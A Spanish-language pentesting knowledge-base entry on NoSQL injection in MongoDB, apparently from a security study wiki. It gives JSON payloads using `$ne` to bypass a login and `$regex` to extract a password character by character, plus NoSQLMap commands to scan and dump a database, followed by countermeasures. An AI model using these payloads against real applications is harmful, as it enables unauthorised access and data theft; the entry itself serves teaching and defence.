---
title: Inyección NoSQL (NoSQLi)
slug: explotacion-nosqli
aliases: [NoSQLi, NoSQL Injection, MongoDB Injection]
fase: [Explotación]
plataforma: Web
dificultad: Intermedia
mitre: [T1190]
related: [analisis-sqli, explotacion-sqli, enumeracion-mongodb]
learning_refs: []
---

# Inyección NoSQL (NoSQLi)

## Descripción
La inyección NoSQL (NoSQLi) es una vulnerabilidad que ocurre cuando una aplicación web incorpora datos del usuario en consultas a bases de datos NoSQL (como MongoDB, Cassandra o Redis) sin un saneamiento adecuado. A diferencia de SQLi tradicional, NoSQLi a menudo utiliza operadores de consulta específicos del motor (como `$gt`, `$ne` en MongoDB) para alterar la lógica de la consulta, permitiendo el bypass de autenticación, la extracción de datos o, en casos extremos, la ejecución de comandos.

## Herramientas
- **NoSQLMap** — herramienta automatizada para identificar y explotar inyecciones NoSQL.
- **Burp Suite** (Intruder) — para realizar ataques de fuerza bruta sobre campos específicos usando operadores NoSQL.
- **mongo** (`mongosh`) — cliente interactivo para interactuar directamente con la base de datos si se logra acceso.

## Comandos / Ejemplos

### Bypass de autenticación en MongoDB (JSON)
```text
# Petición original
{"username": "admin", "password": "password123"}

# Petición manipulada con operador $ne (not equal)
{"username": "admin", "password": {"$ne": "wrong_password"}}
# Resultado: El servidor autentica al usuario porque la contraseña es "no igual" a "wrong_password"
```

### Extracción de datos campo por campo (Regex)
```text
# Probar si el primer carácter de la contraseña empieza por 'a'
{"username": "admin", "password": {"$regex": "^a.*"}}
# Iterar sobre todos los caracteres para extraer el secreto completo
```

### Uso de NoSQLMap
```bash
# Escanear una URL específica en busca de vulnerabilidades NoSQL
nosqlmap --url http://10.10.10.10/login.php --method POST --data "user=admin&pass=admin"
# Intentar volcar la base de datos si se confirma la inyección
nosqlmap --host 10.10.10.10 --mongodb
```

## Contramedidas
- Evitar el paso directo de objetos JSON del usuario a las funciones de consulta del motor de base de datos.
- Utilizar bibliotecas de mapeo (como Mongoose para Node.js) que tipan los datos de entrada de forma estricta.
- Sanitizar las entradas del usuario eliminando o escapando operadores específicos de NoSQL (ej. `$`).
- Implementar el principio de mínimo privilegio en las cuentas de usuario de la base de datos.

## Referencias
- Kim, P. (2018). *The Hacker Playbook 3*. Secure Planet, LLC.
- MITRE Corporation. (2024). ATT&CK Technique T1190: Exploit Public-Facing Application. https://attack.mitre.org/techniques/T1190/
